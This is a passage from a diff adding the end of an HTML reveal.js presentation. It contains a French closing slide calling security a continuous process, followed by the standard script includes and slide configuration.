+              La sécurité n'est pas une fonctionnalité,<br />c'est un
+              <strong>processus continu</strong>.
+            </p>
+          </section>
+        </section>
+</div>
+</div>
+
+<script src="dist/reveal.js"></script>
+<script src="dist/plugin/notes.js"></script>
+<script src="dist/plugin/highlight.js"></script>
+<script>
+Reveal.initialize({
+plugins: [RevealHighlight, RevealNotes],
+hash: true,
+slideNumber: 'c/t',
+progress: true,
+controls: true,
+center: true,
+transition: 'slide',
+width: 1920,
+height: 1080,
+margin: 0.04,
+minScale: 0.2,
+maxScale: 2.0,
+});
+</script>
+</body>
+</html>
